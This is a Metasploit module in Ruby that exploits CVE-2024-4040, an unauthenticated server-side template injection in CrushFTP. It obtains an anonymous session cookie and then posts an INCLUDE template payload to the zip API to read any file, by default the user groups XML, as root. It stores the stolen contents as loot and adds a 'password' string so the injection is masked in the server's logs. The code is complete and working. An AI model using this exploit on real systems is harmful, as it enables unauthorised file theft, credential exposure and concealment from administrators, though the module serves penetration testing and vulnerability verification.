##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CrushFTP Unauthenticated Arbitrary File Read',
        'Description' => %q{
          This module leverages an unauthenticated server-side template injection vulnerability in CrushFTP < 10.7.1 and
          < 11.1.0 (as well as legacy 9.x versions). Attackers can submit template injection payloads to the web API without
          authentication. When attacker payloads are reflected in the server's responses, the payloads are evaluated. The
          primary impact of the injection is arbitrary file read as root, which can result in authentication bypass, remote
          code execution, and NetNTLMv2 theft (when the host OS is Windows and SMB egress traffic is permitted).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'remmons-r7', # MSF Module & Rapid7 Analysis
        ],
        'References' => [
          ['CVE', '2024-4040'],
          ['URL', 'https://attackerkb.com/topics/20oYjlmfXa/cve-2024-4040/rapid7-analysis']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          # The CrushFTP.log file will contain a log of the HTTP requests
          # Similarly, files in logs/session_logs/ will contain a log of the HTTP requests
          # The sessions.obj file will temporarily persist details of recent requests
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(443),
        Opt::RHOST('0.0.0.0'),
        OptBool.new('STORE_LOOT', [false, 'Store the target file as loot', true]),
        OptString.new('TARGETFILE', [true, 'The target file to read. This can be a full path, a relative path, or a network share path (if firewalls permit)', 'users/MainUsers/groups.XML']),
      ]
    )
  end

  def check
    # Unauthenticated requests to WebInterface endpoints should receive a response containing an 'anonymous' user session cookie
    res_anonymous_check = get_anon_session

    return Msf::Exploit::CheckCode::Unknown('Connection failed') unless res_anonymous_check

    # Confirm that the response returned a CrushAuth cookie and the status code was 404
    if (res_anonymous_check.code != 404) || !res_anonymous_check.get_cookies.include?('CrushAuth')
      return Msf::Exploit::CheckCode::Unknown('The application did not return a 404 response that provided an anonymous session cookie')
    end

    # Extract the CrushAuth anonymous session cookie value using regex
    crushauth_cookie = res_anonymous_check&.get_cookies&.match(/\d{13}_[A-Za-z0-9]{30}/)

    # The string "password" is included to invoke CrushFTP's sensitive parameter redaction in logs. The injection will be logged as "********"
    # NOTE: Due to an apparent bug in the way CrushFTP redacts data, if file paths contain ":", some of the injection will be leaked in logs
    res_template_inject = perform_template_injection('{user_name}password', crushauth_cookie)

    return Msf::Exploit::CheckCode::Unknown('Connection failed') unless res_template_inject

    # Confirm that the "{user_name}" template injection evaluates to "anonymous" in the response
    unless res_template_inject.body.include?('You need upload permissions to zip a file:anonymous')
      return Msf::Exploit::CheckCode::Safe('Server-side template injection failed!')
    end

    Msf::Exploit::CheckCode::Vulnerable('Server-side template injection successful!')
  end

  def run
    # Unauthenticated requests to WebInterface endpoints should receive a response containing an 'anonymous' user session cookie
    print_status('Fetching anonymous session cookie...')
    res_anonymous = get_anon_session

    fail_with(Failure::Unknown, 'Connection failed') unless res_anonymous

    # Confirm that the response returned a CrushAuth cookie and the status code was 404
    if (res_anonymous&.code != 404) || res_anonymous&.get_cookies !~ /CrushAuth=([^;]+;)/
      fail_with(Failure::Unknown, 'The application did not return a 404 response that provided an anonymous session cookie')
    end

    # Extract the CrushAuth cookie value from the response 'Set-Cookie' data
    crushauth_cookie = res_anonymous&.get_cookies&.match(/\d{13}_[A-Za-z0-9]{30}/)

    file_name = datastore['TARGETFILE']

    print_status("Using template injection to read file: #{file_name}")

    # These tags will be used to identify the beginning and end of the file data in the response
    # The string "_pass_" is prepended to the injection to invoke CrushFTP sensitive parameter redaction in logs. The injection will be logged as "********"
    # NOTE: Due to an apparent bug in the way CrushFTP redacts data, if file paths contain ":", some of the injection will be leaked in logs
    file_begin_tag = '_pass_'
    file_end_tag = 'file-end'

    # Perform the template injection for file read
    res_steal_file = perform_template_injection("#{file_begin_tag}<INCLUDE>#{file_name}</INCLUDE>#{file_end_tag}", crushauth_cookie)

    # Check for failure conditions
    fail_with(Failure::Unknown, 'Connection failed - unable to perform template injection') unless res_steal_file

    if (res_steal_file&.code != 200) || !(res_steal_file.body.include? file_begin_tag)
      fail_with(Failure::Unknown, 'The application did not return the file contents as expected')
    end

    if res_steal_file.body.include? "#{file_begin_tag}<INCLUDE>#{file_name}</INCLUDE>#{file_end_tag}"
      fail_with(Failure::NotFound, 'The requested file was not found by the server')
    end

    # Isolate the file contents in the response by extracting data between the begin and end tags
    file_data = res_steal_file.body[res_steal_file.body.index(file_begin_tag) + file_begin_tag.length..]
    file_data = file_data.split(file_end_tag)[0]

    if datastore['STORE_LOOT']
      print_good('Storing the file data to loot...')
      store_loot(File.basename(file_name), 'text/plain', datastore['RHOST'], file_data, file_name, 'File read from CrushFTP server')
    else
      # A new line is sent before file contents for better readability
      print_good("File read succeeded! \n#{file_data}")
    end
  end

  # A GET request to /WebInterface/ should return a 404 response that contains an 'anonymous' user cookie
  def get_anon_session
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri('WebInterface/')
    )
  end

  # The 'zip' API function is used here, but any unauthenticated API function that reflects parameter data in the response should work
  def perform_template_injection(payload, cookie)
    send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri('WebInterface', 'function/'),
        'cookie' => "CrushAuth=#{cookie}",
        'headers' => { 'Connection' => 'close' },
        'vars_post' => {
          'command' => 'zip',
          'path' => payload,
          'names' => '/',
          # The c2f parameter must be the last four characters of the primary session cookie
          'c2f' => cookie.to_s[-4..]
        }
      }
    )
  end
end
